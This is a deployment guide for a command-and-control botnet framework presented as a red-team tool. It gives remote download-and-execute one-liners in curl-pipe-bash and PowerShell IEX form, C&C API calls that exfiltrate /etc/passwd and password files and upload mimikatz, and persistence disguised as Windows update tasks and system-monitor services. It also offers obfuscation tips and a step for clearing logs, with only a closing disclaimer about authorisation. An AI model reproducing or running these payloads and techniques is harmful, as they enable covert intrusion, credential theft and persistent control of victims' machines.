# Red Team Deployment Guide

## Quick Start for Pentesters

### 1. Configure Your C&C Server

```bash
# Edit src/cnc_server.py to bind to external interface
# Change: app.run(debug=True)
# To: app.run(host='0.0.0.0', port=5000, debug=False)

# Start the server
python src/cnc_server.py
```

### 2. Configure Payloads

All payloads support environment variables for easy configuration:

```bash
export CNC_SERVER="http://YOUR_IP:5000"
export SSH_PASSWORD="target_password"
export BOT_ID="custom-id"  # Optional
```

### 3. Deployment Options

#### Option A: Direct Execution (Requires Initial Access)
```bash
# Linux/Mac
curl http://your-server/linux_agent.sh | bash

# Or with parameters
CNC_SERVER="http://10.0.0.1:5000" SSH_PASSWORD="pass123" bash linux_agent.sh

# Windows (PowerShell)
IEX (New-Object Net.WebClient).DownloadString('http://your-server/windows_agent.ps1')

# Or with parameters
$env:CNC_SERVER="http://10.0.0.1:5000"; $env:SSH_PASSWORD="pass123"; .\windows_agent.ps1 -Hidden
```

#### Option B: Python Agent (Cross-Platform)
```bash
# Configure first
python python_agent.py --server http://10.0.0.1:5000 --daemon --verbose

# No persistence (good for testing)
python python_agent.py --server http://10.0.0.1:5000 --no-persist

# Silent background execution
python python_agent.py --daemon
```

#### Option C: Manual SSH Transfer
```bash
# Copy to target
scp payloads/linux_agent.sh user@target:/tmp/update.sh

# Execute on target
ssh user@target "bash /tmp/update.sh http://your-ip:5000"
```

#### Option D: Web Server Delivery
```bash
# Host payloads on a web server
cd payloads
python3 -m http.server 8080

# On target machine
curl http://attacker-ip:8080/linux_agent.sh | bash
```

### 4. Command Execution Examples

```bash
# Execute command on bot
curl -X POST http://localhost:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-bot-1234", "command": "whoami"}'

# Download file from target
curl -X POST http://localhost:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-bot-1234", "remote_path": "/etc/passwd", "local_path": "./passwd.txt"}'

# Upload payload/tool to target
curl -X POST http://localhost:5000/upload_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-bot-1234", "local_path": "./mimikatz.exe", "remote_path": "C:\\Temp\\m.exe"}'
```

### PowerShell Examples
```powershell
# Execute command
$body = @{bot_id="target-bot"; command="hostname"} | ConvertTo-Json
Invoke-RestMethod -Uri "http://localhost:5000/send_command" -Method POST -ContentType "application/json" -Body $body

# Download file
$body = @{bot_id="target-bot"; remote_path="C:\Users\Admin\Desktop\passwords.txt"; local_path="./loot.txt"} | ConvertTo-Json
Invoke-RestMethod -Uri "http://localhost:5000/download_file" -Method POST -ContentType "application/json" -Body $body
```

## Stealth Features

### Python Agent
- **Stealth mode**: Suppresses all output by default
- **Daemon mode**: Runs in background (Unix-like systems)
- **Auto-reconnect**: Automatically retries if C&C is down
- **No external dependencies**: Falls back to urllib if requests unavailable

### Linux Agent
- **Auto-daemonize**: Automatically forks to background
- **Process hiding**: Copies itself to hidden location
- **Multiple persistence**: Systemd, cron, RC files, user systemd
- **Silent execution**: All output to /dev/null

### Windows Agent
- **Hidden window**: Use `-Hidden` flag to hide PowerShell window
- **VBScript wrapper**: Runs silently from startup
- **Multiple persistence**: Registry, scheduled tasks, startup folder
- **Error handling**: Robust retry logic

## Obfuscation Tips

### 1. Encode PowerShell
```powershell
$command = Get-Content .\windows_agent.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute on target
powershell -EncodedCommand $encoded
```

### 2. Rename Scripts
Use innocuous names:
- `windows_update.ps1`
- `system_check.sh`
- `network_diagnostic.py`

### 3. Change String Values
Edit these in the payload:
- Bot ID format
- Service/task names
- File paths
- Function names

### 4. Use DNS Instead of IP
```bash
export CNC_SERVER="http://update.example.com:5000"
```

### 5. Base64 Encode URLs
```python
import base64
server = base64.b64encode(b"http://10.0.0.1:5000").decode()
# Decode in payload: base64.b64decode(server).decode()
```

## Red Team Workflow

### Phase 1: Setup
1. Deploy C&C server on your infrastructure
2. Configure firewall rules (allow port 5000)
3. Set up domain/DNS (optional but recommended)
4. Test C&C locally

### Phase 2: Payload Preparation
1. Edit payload configurations (IP, password, etc.)
2. Test payloads in lab environment
3. Obfuscate if needed
4. Host on web server or prepare for manual delivery

### Phase 3: Initial Access
1. Gain initial access (phishing, exploit, etc.)
2. Deploy appropriate payload for target OS
3. Verify registration in C&C
4. Confirm persistence

### Phase 4: Post-Exploitation
1. Execute commands via C&C API
2. Exfiltrate data using download_file
3. Upload additional tools using upload_file
4. Maintain access through persistence

### Phase 5: Cleanup
1. Remove persistence mechanisms
2. Delete payload files
3. Clear logs
4. Document for client report

## Testing & Validation

### Test Connectivity
```bash
# Check if bot can reach C&C
curl -v http://your-cnc-ip:5000

# Test registration manually
curl -X POST http://your-cnc-ip:5000/add_bot \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"test","host":"10.0.0.1","port":22,"username":"test","password":"test"}'
```

### Test Payload Locally
```bash
# Run without persistence for testing
CNC_SERVER="http://localhost:5000" SSH_PASSWORD="test" python python_agent.py --no-persist --verbose

# Windows
.\windows_agent.ps1 -CncServer "http://localhost:5000" -NoPersist -Verbose
```

### Verify Persistence
```bash
# Linux - Check all methods
systemctl status system-monitor.service
crontab -l | grep agent
cat ~/.bashrc | grep agent
systemctl --user status system-monitor.service

# Windows - Check all methods
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ScheduledTask -TaskName "WindowsUpdateCheck"
dir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

## Troubleshooting

### Agent Not Registering
1. Check C&C server is running and accessible
2. Verify firewall rules
3. Check agent logs (run with --verbose/-Verbose)
4. Test with curl/Invoke-RestMethod manually
5. Verify SSH credentials are correct

### Persistence Not Working
1. Check user permissions
2. Try alternative persistence methods
3. Check antivirus isn't blocking
4. Verify file paths exist
5. Review system logs

### Connection Timeouts
1. Increase timeout values in payload
2. Check network latency
3. Verify no proxy/firewall blocking
4. Test direct HTTP connection

## Cleanup Commands

### Remove All Traces

**Linux:**
```bash
# Stop services
systemctl stop system-monitor.service 2>/dev/null
systemctl disable system-monitor.service 2>/dev/null
systemctl --user stop system-monitor.service 2>/dev/null
systemctl --user disable system-monitor.service 2>/dev/null

# Remove files
rm -f /etc/systemd/system/system-monitor.service
rm -f ~/.config/systemd/user/system-monitor.service
rm -f /tmp/.system_cache

# Clean cron
crontab -l | grep -v "agent" | crontab -

# Clean RC files
sed -i '/System monitor/d' ~/.bashrc ~/.profile ~/.bash_profile 2>/dev/null
```

**Windows:**
```powershell
# Remove registry
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue

# Remove scheduled task
Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -Confirm:$false -ErrorAction SilentlyContinue

# Remove startup items
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_service.*" -Force -ErrorAction SilentlyContinue
```

## Legal & Ethical Considerations

**ONLY use these tools:**
- On systems you own
- With explicit written authorization
- During authorized penetration tests
- In compliance with rules of engagement
- Within legal boundaries

**Document everything:**
- Systems accessed
- Commands executed
- Data exfiltrated
- Persistence installed
- Cleanup performed

This is a professional tool for authorized security testing. Misuse is illegal and unethical.
